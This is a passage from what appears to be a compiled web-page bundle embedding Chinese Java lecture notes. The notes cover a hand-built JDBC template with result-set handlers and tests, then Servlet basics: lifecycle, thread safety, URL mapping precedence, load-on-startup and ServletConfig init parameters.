beanClass.newInstance();\r\n\r\n            //5.判断是否有结果集\r\n            if(rs.next()) {\r\n                //6.得到所有的列名\r\n                //6.1先得到结果集的源信息\r\n                ResultSetMetaData rsmd = rs.getMetaData();\r\n                //6.2还要得到有多少列\r\n                int columnCount = rsmd.getColumnCount();\r\n                //6.3遍历列数\r\n                for(int i = 1; i <= columnCount; i++) {\r\n                    //6.4得到每列的列名\r\n                    String columnName = rsmd.getColumnName(i);\r\n                    //6.5通过列名获取数据\r\n                    Object columnValue = rs.getObject(columnName);\r\n\r\n                    //6.6列名其实就是对象中成员变量的名称。于是就可以使用列名得到对象中属性的描述器(get和set方法)\r\n                    PropertyDescriptor pd = new PropertyDescriptor(columnName.toLowerCase(),beanClass);\r\n                    //6.7获取set方法\r\n                    Method writeMethod = pd.getWriteMethod();\r\n                    //6.8执行set方法，给成员变量赋值\r\n                    writeMethod.invoke(bean,columnValue);\r\n                }\r\n            }\r\n\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n        //7.将对象返回\r\n        return bean;\r\n    }\r\n}\r\n\r\n```\r\n\r\n- BeanListHandler实现类\r\n\r\n```java\r\n/*\r\n    实现类2：用于将结果集封装到集合中\r\n */\r\npublic class BeanListHandler<T> implements ResultSetHandler<T> {\r\n\r\n    //1.声明对象变量\r\n    private Class<T> beanClass;\r\n\r\n    //2.有参构造为变量赋值\r\n    public BeanListHandler(Class<T> beanClass) {\r\n        this.beanClass = beanClass;\r\n    }\r\n\r\n    @Override\r\n    public List<T> handler(ResultSet rs) {\r\n        //3.创建集合对象\r\n        List<T> list = new ArrayList<>();\r\n\r\n        try{\r\n            //4.遍历结果集对象\r\n            while(rs.next()) {\r\n                //5.创建传递参数的对象\r\n                T bean = beanClass.newInstance();\r\n                //6.得到所有的列名\r\n                //6.1先得到结果集的源信息\r\n                ResultSetMetaData rsmd = rs.getMetaData();\r\n                //6.2还要得到有多少列\r\n                int columnCount = rsmd.getColumnCount();\r\n                //6.3遍历列数\r\n                for(int i = 1; i <= columnCount; i++) {\r\n                    //6.4得到每列的列名\r\n                    String columnName = rsmd.getColumnName(i);\r\n                    //6.5通过列名获取数据\r\n                    Object columnValue = rs.getObject(columnName);\r\n\r\n                    //6.6列名其实就是对象中成员变量的名称。于是就可以使用列名得到对象中属性的描述器(get和set方法)\r\n                    PropertyDescriptor pd = new PropertyDescriptor(columnName.toLowerCase(),beanClass);\r\n                    //6.7获取set方法\r\n                    Method writeMethod = pd.getWriteMethod();\r\n                    //6.8执行set方法，给成员变量赋值\r\n                    writeMethod.invoke(bean,columnValue);\r\n                }\r\n                //7.将对象保存到集合中\r\n                list.add(bean);\r\n            }\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        //8.返回结果\r\n        return list;\r\n    }\r\n}\r\n\r\n```\r\n\r\n- ScalarHandler实现类\r\n\r\n```java\r\n/*\r\n    实现类3：用于返回一个聚合函数的查询结果\r\n */\r\npublic class ScalarHandler<T> implements ResultSetHandler<T> {\r\n    @Override\r\n    public Long handler(ResultSet rs) {\r\n        //1.声明一个变量\r\n        Long value = null;\r\n        try{\r\n            //2.判断是否有结果\r\n            if(rs.next()) {\r\n                //3.获取结果集的源信息\r\n                ResultSetMetaData rsmd = rs.getMetaData();\r\n                //4.获取第一列的列名\r\n                String columnName = rsmd.getColumnName(1);\r\n                //5.根据列名获取值\r\n                value = rs.getLong(columnName);\r\n            }\r\n        } catch(Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        //6.将结果返回\r\n        return value;\r\n    }\r\n}\r\n\r\n```\r\n\r\n- JDBCTemplate类\r\n\r\n```java\r\npublic class JDBCTemplate {\r\n    private DataSource dataSource;\r\n    private Connection con;\r\n    private PreparedStatement pst;\r\n    private ResultSet rs;\r\n\r\n    public JDBCTemplate(DataSource dataSource) {\r\n        this.dataSource = dataSource;\r\n    }\r\n    \r\n    /*\r\n    \t专用于执行聚合函数sql语句的方法\r\n    */\r\n    public Long queryForScalar(String sql, ResultSetHandler<Long> rsh, Object...objs) {\r\n        Long result = null;\r\n        try{\r\n            con = dataSource.getConnection();\r\n            pst = con.prepareStatement(sql);\r\n\r\n            //获取sql语句中的参数源信息\r\n            ParameterMetaData pData = pst.getParameterMetaData();\r\n            int parameterCount = pData.getParameterCount();\r\n\r\n            //判断参数个数是否一致\r\n            if(parameterCount != objs.length) {\r\n                throw new RuntimeException("参数个数不匹配");\r\n            }\r\n\r\n            //为sql语句中的?占位符赋值\r\n            for (int i = 0; i < objs.length; i++) {\r\n                pst.setObject(i+1,objs[i]);\r\n            }\r\n\r\n            //执行sql语句\r\n            rs = pst.executeQuery();\r\n\r\n            //通过ScalarHandler方式对结果进行处理\r\n            result = rsh.handler(rs);\r\n\r\n        } catch(Exception e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //释放资源\r\n            DataSourceUtils.close(con,pst,rs);\r\n        }\r\n\r\n        //将结果返回\r\n        return result;\r\n    }\r\n\r\n    /*\r\n    \t专用于查询所有记录sql语句的方法\r\n    */\r\n    public <T> List<T> queryForList(String sql, ResultSetHandler<T> rsh, Object...objs) {\r\n        List<T> list = new ArrayList<>();\r\n        try{\r\n            con = dataSource.getConnection();\r\n            pst = con.prepareStatement(sql);\r\n\r\n            //获取sql语句中的参数源信息\r\n            ParameterMetaData pData = pst.getParameterMetaData();\r\n            int parameterCount = pData.getParameterCount();\r\n\r\n            //判断参数个数是否一致\r\n            if(parameterCount != objs.length) {\r\n                throw new RuntimeException("参数个数不匹配");\r\n            }\r\n\r\n            //为sql语句中的?占位符赋值\r\n            for (int i = 0; i < objs.length; i++) {\r\n                pst.setObject(i+1,objs[i]);\r\n            }\r\n\r\n            //执行sql语句\r\n            rs = pst.executeQuery();\r\n\r\n            //通过BeanListHandler方式对结果进行处理\r\n            list = rsh.handler(rs);\r\n\r\n        } catch(Exception e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //释放资源\r\n            DataSourceUtils.close(con,pst,rs);\r\n        }\r\n\r\n        //将结果返回\r\n        return list;\r\n    }\r\n\r\n\r\n    /*\r\n    \t专用于执行查询一条记录sql语句的方法\r\n    */\r\n    public <T> T queryForObject(String sql, ResultSetHandler<T> rsh, Object...objs) {\r\n        T obj = null;\r\n        try{\r\n            con = dataSource.getConnection();\r\n            pst = con.prepareStatement(sql);\r\n\r\n            //获取sql语句中的参数源信息\r\n            ParameterMetaData pData = pst.getParameterMetaData();\r\n            int parameterCount = pData.getParameterCount();\r\n\r\n            //判断参数个数是否一致\r\n            if(parameterCount != objs.length) {\r\n                throw new RuntimeException("参数个数不匹配");\r\n            }\r\n\r\n            //为sql语句中的?占位符赋值\r\n            for (int i = 0; i < objs.length; i++) {\r\n                pst.setObject(i+1,objs[i]);\r\n            }\r\n\r\n            //执行sql语句\r\n            rs = pst.executeQuery();\r\n\r\n            //通过BeanHandler方式对结果进行处理\r\n            obj = rsh.handler(rs);\r\n\r\n        } catch(Exception e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //释放资源\r\n            DataSourceUtils.close(con,pst,rs);\r\n        }\r\n\r\n        //将结果返回\r\n        return obj;\r\n    }\r\n}\r\n\r\n```\r\n\r\n##### 2.4测试自定义JDBC框架的使用\r\n\r\n```java\r\npublic class JDBCTemplateTest {\r\n    //创建JDBCTemplate对象\r\n    JDBCTemplate template = new JDBCTemplate(DataSourceUtils.getDataSource());\r\n\r\n    @Test\r\n    public void selectScalar() {\r\n        //查询student表的记录条数\r\n        String sql = "SELECT COUNT(*) FROM student";\r\n        Long count = template.queryForScalar(sql, new ScalarHandler<Long>());\r\n        System.out.println(count);\r\n    }\r\n\r\n    @Test\r\n    public void selectAll() {\r\n        //查询所有学生信息\r\n        String sql = "SELECT * FROM student";\r\n        List<Student> list = template.queryForList(sql, new BeanListHandler<Student>(Student.class));\r\n        for(Student stu : list) {\r\n            System.out.println(stu);\r\n        }\r\n    }\r\n\r\n    @Test\r\n    public void selectOne() {\r\n        //查询张三这条记录\r\n        String sql = "SELECT * FROM student WHERE sid=?";\r\n        //通过BeanHandler将结果封装成一个Student对象\r\n        Student stu = template.queryForObject(sql, new BeanHandler<Student>(Student.class), 1);\r\n        System.out.println(stu);\r\n    }\r\n\r\n    @Test\r\n    public void insert() {\r\n        //新增周七记录\r\n        String sql = "INSERT INTO student VALUES (?,?,?,?)";\r\n        Object[] params = {5,"周七",27,"2007-07-07"};\r\n        int result = template.update(sql, params);\r\n        System.out.println(result);\r\n    }\r\n\r\n    @Test\r\n    public void delete() {\r\n        //删除周七这条记录\r\n        String sql = "DELETE FROM student WHERE sid=?";\r\n        int result = template.update(sql, 5);\r\n        System.out.println(result);\r\n    }\r\n\r\n    @Test\r\n    public void update() {\r\n        //修改张三的年龄为33\r\n        String sql = "UPDATE student SET age=? WHERE name=?";\r\n        Object[] params = {33,"张三"};\r\n        int result = template.update(sql,params);\r\n        System.out.println(result);\r\n    }\r\n}\r\n\r\n```\r\n\r\n',wr={data:function(){return{MainComponent:xr}}},Er=wr,Tr=Object(u["a"])(Er,fr,_r,!1,null,"58b04fa8",null),kr=Tr.exports,Cr={mixins:[sr["a"]],components:{m1:yr,m2:kr},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"JDBC-01-授课笔记",value:"m1"},{label:"JDBC-02-授课笔记",value:"m2"}]}}},jr=Cr,Mr=Object(u["a"])(jr,ur,mr,!1,null,"44cb1a20",null),Rr=Mr.exports,Lr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},Or=[],Ar=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ir=[],Dr='\x3c!--\n * @Date           : 2021-04-12 17:00:35\n * @FilePath       : /jinnian-space/src/pages/java/module/javaweb/md/Servlet-授课.md\n * @Description    : \n--\x3e\n# Servlet-授课\n\n# 1 Servlet\n\n## 1.1 Servlet概述\n\nServlet是SUN公司提供的一套规范，名称就叫Servlet规范，它也是JavaEE规范之一。我们可以像学习Java基础一样，通过API来学习Servlet。这里需要注意的是，在我们之前JDK的API中是没有Servlet规范的相关内容，需要使用JavaEE的API。目前在Oracle官网中的最新版本是[JavaEE8](https://www.oracle.com/technetwork/java/javaee/documentation/ee8-release-notes-3894362.html)，该网址中介绍了JavaEE8的一些新特性。当然，我们可以通过访问[官方API](https://javaee.github.io/javaee-spec/javadocs/)，学习和查阅里面的内容。\n\n打开官方API网址，在左上部分找到javax.servlet包，在左下部分找到Servlet，如下图显示：\n\n![Servlet的API官网](./img/java/javaweb/Servlet-授课.assets/Servlet的API官网.png)\n\n通过阅读API，我们得到如下信息：\n\n第一：Servlet是一个运行在web服务端的java小程序\n\n第二：它可以用于接收和响应客户端的请求\n\n第三：要想实现Servlet功能，可以实现Servlet接口，继承GenericServlet或者HttpServlet\n\n第四：每次请求都会执行service方法\n\n第五：Servlet还支持配置\n\n具体请看下图：\n\n![ServletAPI详解](./img/java/javaweb/Servlet-授课.assets/ServletAPI详解.png)\n\n## 1.2 Servlet入门\n\n### 1.2.1 Servlet编码步骤\n\n#### 1）编码步骤\n\n**第一步：前期准备-创建JavaWeb工程**\n\n**第二步：编写一个普通类继承GenericServlet并重写service方法**\n\n**第三步：在web.xml配置Servlet**\n\n#### 2）测试\n\n**在Tomcat中部署项目**\n\n**在浏览器访问Servlet**\n\n![测试入门案例执行](./img/java/javaweb/Servlet-授课.assets/测试入门案例执行.png)\n\n### 1.2.2 Servlet执行过程分析\n\n我们通过浏览器发送请求，请求首先到达Tomcat服务器，由服务器解析请求URL，然后在部署的应用列表中找到我们的应用。接下来，在我们的应用中找应用里的web.xml配置文件，在web.xml中找到FirstServlet的配置，找到后执行service方法，最后由FirstServlet响应客户浏览器。整个过程如下图所示：\n\n![Servlet执行过程图](./img/java/javaweb/Servlet-授课.assets/Servlet执行过程图.jpg)\n\n一句话总结执行过程：\n\n浏览器——>Tomcat服务器——>我们的应用——>应用中的web.xml——>FirstServlet——>响应浏览器\n\n### 1.2.3 Servlet类视图\n\n在《Tomcat和Http协议》这天课程和刚才的入门案例中，我们都定义了自己的Servlet，实现的方式都是选择继承GenericServlet，在Servlet的API介绍中，它提出了我们除了继承GenericServlet外还可以继承HttpServlet，通过查阅servlet的类视图，我们看到GenericServlet还有一个子类HttpServlet。同时，在service方法中还有参数ServletRequest和ServletResponse，它们的关系如下图所示：\n\n![Servlet类视图](./img/java/javaweb/Servlet-授课.assets/Servlet类视图.png)\n\n### 1.2.4 Servlet编写方式\n\n#### 1）编写方式说明\n\n我们在实现Servlet功能时，可以选择以下三种方式：\n\n第一种：实现Servlet接口，接口中的方法必须全部实现。\n\n​\t\t\t  使用此种方式，表示接口中的所有方法在需求方面都有重写的必要。此种方式支持最大程度的自定义。\n\n第二种：继承GenericServlet，service方法必须重写，其他方可根据需求，选择性重写。\n\n​\t\t\t  使用此种方式，表示只在接收和响应客户端请求这方面有重写的需求，而其他方法可根据实际需求选择性重写，使我们的开发Servlet变得简单。但是，此种方式是和HTTP协议无关的。\n\n第三种：继承HttpServlet，它是javax.servlet.http包下的一个抽象类，是GenericServlet的子类。<b><font color=\'red\'>如果我们选择继承HttpServlet时，只需要重写doGet和doPost方法，不要覆盖service方法。</font></b>\n\n​\t\t\t\t使用此种方式，表示我们的请求和响应需要和HTTP协议相关。也就是说，我们是通过HTTP协议来访问的。那么每次请求和响应都符合HTTP协议的规范。请求的方式就是HTTP协议所支持的方式（目前我们只知道GET和POST，而实际HTTP协议支持7种请求方式，GET POST PUT DELETE TRACE OPTIONS HEAD )。\n\n#### 2）HttpServlet的使用细节\n\n**第一步：在入门案例的工程中创建一个Servlet继承HttpServlet**\n\n<font color=\'red\'>注意：不要重写任何方法</font>，如下图所示：\n\n![HttpServlet的使用1](./img/java/javaweb/Servlet-授课.assets/HttpServlet的使用1.png)\n\n![HttpServlet的使用2](./img/java/javaweb/Servlet-授课.assets/HttpServlet的使用2.png)\n\n**第二步：部署项目并测试访问**\n\n当我们在地址栏输入ServletDemo2的访问URL时，出现了访问错误，状态码是405。提示信息是：方法不允许。\n\n**第三步：分析原因** \n\n得出HttpServlet的使用结论：\n\n​\t <b><font color=\'red\'>我们继承了HttpServlet，需要重写里面的doGet和doPost方法来接收get方式和post方式的请求。</font></b>\n\n为了实现代码的可重用性，我们只需要在doGet或者doPost方法中一个里面提供具体功能即可，而另外的那个方法只需要调用提供了功能的方法。\n\n## 1.3 Servlet使用细节\n\n### 1.3.1 Servlet的生命周期\n\n对象的生命周期，就是对象从生到死的过程，即：出生——活着——死亡。用更偏向 于开发的官方说法就是对象创建到销毁的过程。\n\n出生：请求第一次到达Servlet时，对象就创建出来，并且初始化成功。只出生一次，就放到内存中。\n\n活着：服务器提供服务的整个过程中，该对象一直存在，每次只是执行service方法。\n\n死亡：当服务停止时，或者服务器宕机时，对象消亡。\n\n通过分析Servlet的生命周期我们发现，它的实例化和初始化只会在请求第一次到达Servlet时执行，而销毁只会在Tomcat服务器停止时执行，由此我们得出一个结论，Servlet对象只会创建一次，销毁一次。所以，Servlet对象只有一个实例。如果一个对象实例在应用中是唯一的存在，那么我们就说它是单实例的，即运用了单例模式。\n\n### 1.3.2 Servlet的线程安全\n\n由于Servlet运用了单例模式，即整个应用中只有一个实例对象，所以我们需要分析这个唯一的实例中的类成员是否线程安全。接下来，我们来看下面的的示例：\n\n```java\n/*\n    Servlet线程安全\n */\npublic class ServletDemo04 extends HttpServlet{\n    //1.定义用户名成员变量\n    //private String username = null;\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String username = null;\n        //synchronized (this) {\n            //2.获取用户名\n            username = req.getParameter("username");\n\n            try {\n                Thread.sleep(3000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            //3.获取输出流对象\n            PrintWriter pw = resp.getWriter();\n\n            //4.响应给客户端浏览器\n            pw.print("welcome:" + username);\n\n            //5.关流\n            pw.close();\n        //}\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n启动两个浏览器，输入不同的参数，访问之后发现输出的结果都是一样，所以出现线程安全问题\n\n![Servlet的线程安全问题](./img/java/javaweb/Servlet-授课.assets/Servlet的线程安全问题.png)\n\n通过上面的测试我们发现，在Servlet中定义了类成员之后，多个浏览器都会共享类成员的数据。其实每一个浏览器端发送请求，就代表是一个线程，那么多个浏览器就是多个线程，所以测试的结果说明了多个线程会共享Servlet类成员中的数据，其中任何一个线程修改了数据，都会影响其他线程。因此，我们可以认为Servlet它不是线程安全的。\n\n分析产生这个问题的根本原因，其实就是因为Servlet是单例，单例对象的类成员只会随类实例化时初始化一次，之后的操作都是改变，而不会重新初始化。\n\n解决这个问题也非常简单，就是在Servlet中定义类成员要慎重。如果类成员是共用的，并且只会在初始化时赋值，其余时间都是获取的话，那么是没问题。如果类成员并非共用，或者每次使用都有可能对其赋值，那么就要考虑线程安全问题了，把它定义到doGet或者doPost方法里面去就可以了。\n\n### 1.3.3 Servlet的注意事项\n\n#### 1）映射Servlet的细节\n\nServlet支持三种映射方式，以达到灵活配置的目的。\n\n首先编写一个Servlet，代码如下：\n\n```java\n/**\n * 演示Servlet的映射方式\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo5 extends HttpServlet {\n\n    /**\n     * doGet方法输出一句话\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        System.out.println("ServletDemo5接收到了请求");\n    }\n\n    /**\n     * 调用doGet方法\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n**第一种：指名道姓的方式**\n\n​\t\t\t   此种方式，只有和映射配置一模一样时，Servlet才会接收和响应来自客户端的请求。\n\n​\t\t\t   例如：映射为：/servletDemo5\n\n​\t\t\t\t\t\t   访问URL：http://localhost:8585/servlet_demo/servletDemo5\n\n![Servlet映射1](./img/java/javaweb/Servlet-授课.assets/Servlet映射1.png)\n\n**第二种：/开头+通配符的方式**\n\n​\t\t\t   此种方式，只要符合目录结构即可，不用考虑结尾是什么。\n\n​\t\t\t\t例如：映射为：/servlet/*\n\n​\t\t\t\t\t\t\t访问URL：http://localhost:8585/servlet/itheima\n\n​\t\t\t\t\t\t\t\t\t\t\t   http://localhost:8585/servlet/itcast.do\n\n​\t\t\t\t\t\t\t这两个URL都可以。因为用的*，表示/servlet/后面的内容是什么都可以。\n\n![Servlet映射2](./img/java/javaweb/Servlet-授课.assets/Servlet映射2.png)\n\n**第三种：通配符+固定格式结尾**\n\n​\t\t\t\t此种方式，只要符合固定结尾格式即可，其前面的访问URI无须关心（注意协议，主机和端口必须正确）\n\n​\t\t\t\t例如：映射为：*.do\n\n​\t\t\t\t\t\t\t访问URL：http://localhost:8585/servlet/itcast.do\n\n​\t\t\t\t\t\t\t\t\t\t\t\thttp://localhost:8585/itheima.do\n\n​\t\t\t\t\t\t\t这两个URL都可以方法。因为都是以.do作为结尾，而前面用*号通配符配置的映射，所有无须关心。\n\n![Servlet映射3](./img/java/javaweb/Servlet-授课.assets/Servlet映射3.png)\n\n通过测试我们发现，Servlet支持多种配置方式，但是由此也引出了一个问题，当有两个及以上的Servlet映射都符合请求URL时，由谁来响应呢？注意：HTTP协议的特征是一请求一响应的规则。那么有一个请求，必然有且只有一个响应。所以，我们接下来明确一下，多种映射规则的优先级。\n\n先说结论：指名道姓的方式优先级最高，带有通配符的映射方式，有/的比没/的优先级高\n\n所以，我们前面讲解的三种映射方式的优先级为：第一种>第二种>第三种。\n\n演示代码如下：\n\n```java\n/**\n * 它和ServletDemo5组合演示Servlet的访问优先级问题\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo6 extends HttpServlet {\n\n    /**\n     * doGet方法输出一句话\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        System.out.println("ServletDemo6接收到了请求");\n    }\n\n    /**\n     * 调用doGet方法\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n```xml\n\x3c!--配置ServletDemo6--\x3e\n<servlet>\n    <servlet-name>servletDemo6</servlet-name>\n    <servlet-class>com.itheima.web.servlet.ServletDemo6</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>servletDemo6</servlet-name>\n    <url-pattern>/*</url-pattern>\n</servlet-mapping>\n```\n\n运行结果如下：\n\n![Servlet的优先级](./img/java/javaweb/Servlet-授课.assets/Servlet的优先级.png)\n\n#### 2）多路径映射Servlet\n\n上一小节我们讲解了Servlet的多种映射方式，这一小节我们来介绍一下，一个Servlet的多种路径配置的支持。\n\n它其实就是给一个Servlet配置多个访问映射，从而可以根据不同请求URL实现不同的功能。\n\n首先，创建一个Servlet：\n\n```java\n/**\n * 演示Servlet的多路径映射\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo7 extends HttpServlet {\n\n    /**\n     * 根据不同的请求URL，做不同的处理规则\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //1.获取当前请求的URI\n        String uri = req.getRequestURI();\n        uri = uri.substring(uri.lastIndexOf("/"),uri.length());\n        //2.判断是1号请求还是2号请求\n        if("/servletDemo7".equals(uri)){\n            System.out.println("ServletDemo7执行1号请求的业务逻辑：商品单价7折显示");\n        }else if("/demo7".equals(uri)){\n            System.out.println("ServletDemo7执行2号请求的业务逻辑：商品单价8折显示");\n        }else {\n            System.out.println("ServletDemo7执行基本业务逻辑：商品单价原价显示");\n        }\n    }\n\n    /**\n     * 调用doGet方法\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n接下来，在web.xml配置Servlet：\n\n```xml\n\x3c!--配置ServletDemo7--\x3e\n<servlet>\n    <servlet-name>servletDemo7</servlet-name>\n    <servlet-class>com.itheima.web.servlet.ServletDemo7</servlet-class>\n</servlet>\n\x3c!--映射路径1--\x3e\n<servlet-mapping>\n    <servlet-name>servletDemo7</servlet-name>\n    <url-pattern>/demo7</url-pattern>\n</servlet-mapping>\n\x3c!--映射路径2--\x3e\n<servlet-mapping>\n    <servlet-name>servletDemo7</servlet-name>\n    <url-pattern>/servletDemo7</url-pattern>\n</servlet-mapping>\n\x3c!--映射路径3--\x3e\n<servlet-mapping>\n    <servlet-name>servletDemo7</servlet-name>\n    <url-pattern>/servlet/*</url-pattern>\n</servlet-mapping>\n```\n\n最后，启动服务测试运行结果：\n\n![多路径URL映射](./img/java/javaweb/Servlet-授课.assets/多路径URL映射.png)\n\n#### 3）启动时创建Servlet\n\n我们前面讲解了Servlet的生命周期，Servlet的创建默认情况下是请求第一次到达Servlet时创建的。但是我们都知道，Servlet是单例的，也就是说在应用中只有唯一的一个实例，所以在Tomcat启动加载应用的时候就创建也是一个很好的选择。那么两者有什么区别呢？\n\n- 第一种：应用加载时创建Servlet，它的优势是在服务器启动时，就把需要的对象都创建完成了，从而在使用的时候减少了创建对象的时间，提高了首次执行的效率。它的弊端也同样明显，因为在应用加载时就创建了Servlet对象，因此，导致内存中充斥着大量用不上的Servlet对象，造成了内存的浪费。\n- 第二种：请求第一次访问是创建Servlet，它的优势就是减少了对服务器内存的浪费，因为那些一直没有被访问过的Servlet对象都没有创建，因此也提高了服务器的启动时间。而它的弊端就是，如果有一些要在应用加载时就做的初始化操作，它都没法完成，从而要考虑其他技术实现。\n\n通过上面的描述，相信同学们都能分析得出何时采用第一种方式，何时采用第二种方式。就是当需要在应用加载就要完成一些工作时，就需要选择第一种方式。当有很多Servlet的使用时机并不确定是，就选择第二种方式。\n\n在web.xml中是支持对Servlet的创建时机进行配置的，配置的方式如下：我们就以ServletDemo3为例。\n\n```xml\n\x3c!--配置ServletDemo3--\x3e\n<servlet>\n    <servlet-name>servletDemo3</servlet-name>\n    <servlet-class>com.itheima.web.servlet.ServletDemo3</servlet-class>\n    \x3c!--配置Servlet的创建顺序，当配置此标签时，Servlet就会改为应用加载时创建\n        配置项的取值只能是正整数（包括0），数值越小，表明创建的优先级越高\n    --\x3e\n    <load-on-startup>1</load-on-startup>\n</servlet>\n<servlet-mapping>\n    <servlet-name>servletDemo3</servlet-name>\n    <url-pattern>/servletDemo3</url-pattern>\n</servlet-mapping>\n```\n\n![Servlet的启动顺序](./img/java/javaweb/Servlet-授课.assets/Servlet的启动顺序.png)\n\n#### 4）默认Servlet\n\n默认Servlet是由服务器提供的一个Servlet，它配置在Tomcat的conf目录下的web.xml中。如下图所示：\n\n![默认Servlet](./img/java/javaweb/Servlet-授课.assets/默认Servlet.png)\n\n它的映射路径是<b><font color=\'red\'>`<url-pattern>/<url-pattern>`</font></b>，我们在发送请求时，首先会在我们应用中的web.xml中查找映射配置，找到就执行，这块没有问题。但是当找不到对应的Servlet路径时，就去找默认的Servlet，由默认Servlet处理。所以，一切都是Servlet。\n\n### 1.4 Servlet关系总图\n\n![Servlet类关系总视图](./img/java/javaweb/Servlet-授课.assets/Servlet类关系总视图.png)\n\n# 2 ServletConfig\n\n## 2.1 ServletConfig概述\n\n### 2.1.1 基本概念\n\n它是Servlet的配置参数对象，在Servlet规范中，允许为每个Servlet都提供一些初始化配置。所以，每个Servlet都一个自己的ServletConfig。它的作用是在Servlet初始化期间，把一些配置信息传递给Servlet。\n\n### 2.1.2 生命周期\n\n由于它是在初始化阶段读取了web.xml中为Servlet准备的初始化配置，并把配置信息传递给Servlet，所以生命周期与Servlet相同。这里需要注意的是，如果Servlet配置了`<load-on-startup>1</load-on-startup>`，那么ServletConfig也会在应用加载时创建。\n\n## 2.2 ServletConfig的使用\n\n### 2.2.1 如何获取\n\n首先，我们要清楚的认识到，它可以为每个Servlet都提供初始化参数，所以肯定可以在每个Servlet中都配置。那是配置在Servlet的声明部分，还是映射部分呢？我们接下来先准备一个Servlet，然后给同学们揭秘。\n\n```java\n/**\n * 演示Servlet的初始化参数对象\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo8 extends HttpServlet {\n\n    //定义Servlet配置对象ServletConfig\n    private ServletConfig servletConfig;\n\n    /**\n     * 在初始化时为ServletConfig赋值\n     * @param config\n     * @throws ServletException\n     */\n    @Override\n    public void init(ServletConfig config) throws ServletException {\n        this.servletConfig = config;\n    }\n\n    /**\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //输出ServletConfig\n        System.out.println(servletConfig);\n    }\n\n    /**\n     * 调用doGet方法\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n```xml\n\x3c!--配置ServletDemo8--\x3e\n<servlet>\n    <servlet-name>servletDemo8</servlet-name>\n    <servlet-class>com.itheima.web.servlet.ServletDemo8</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>servletDemo8</servlet-name>\n    <url-pattern>/servletDemo8</url-pattern>\n</servlet-mapping>\n```\n\n### 2.2.2 如何配置\n\n在上一小节中，我们已经准备好了Servlet，同时也获取到了它的ServletConfig对象，在本小节中我们将告诉同学们如何配置初始化参数，它需要使用`<servlet>`标签中的`<init-param>`标签来配置。这也就揭秘上一小节的悬念，Servlet的初始化参数都是配置在Servlet的声明部分的。并且每个Servlet都支持有多个初始化参数，并且初始化参数都是以键值对的形式存在的。接下来，我们看配置示例：\n\n```xml\n\x3c!--配置ServletDemo8--\x3e\n<servlet>\n    <servlet-name>servletDemo8</servlet-name>\n    <servlet-class>com.itheima.web.servlet.ServletDemo8</servlet-class>\n    \x3c!--配置初始化参数--\x3e\n    <init-param>\n        \x3c!--用于获取初始化参数的key--\x3e\n        <param-name>encoding</param-name>\n        \x3c!--初始化参数的值--\x3e\n        <param-value>UTF-8</param-value>\n    </init-param>\n    \x3c!--每个初始化参数都需要用到init-param标签--\x3e\n    <init-param>\n        <param-name>servletInfo</param-name>\n        <param-value>This is Demo8</param-value>\n    </init-param>\n</servlet>\n<servlet-mapping>\n    <servlet-name>servletDemo8</servlet-name>\n    <url-pattern>/servletDemo8</url-pattern>\n</servlet-mapping>\n```\n\n### 2.2.3 常用方法\n\n![ServletConfig对象](./img/java/javaweb/Servlet-授课.assets/ServletConfig对象.png)\n\n```java\n/**\n * 演示Servlet的初始化参数对象\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo8 extends HttpServlet {\n\n    //定义Servlet配置对象ServletConfig\n    private ServletConfig servletConfig;\n\n    /**\n     * 在初始化时为ServletConfig赋值\n     * @param config\n     * @throws ServletException\n     */\n    @Override\n    public void init(ServletConfig config) throws ServletException {\n        this.servletConfig = config;\n    }\n\n    /**\n     * doGet方法输出一句话\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * 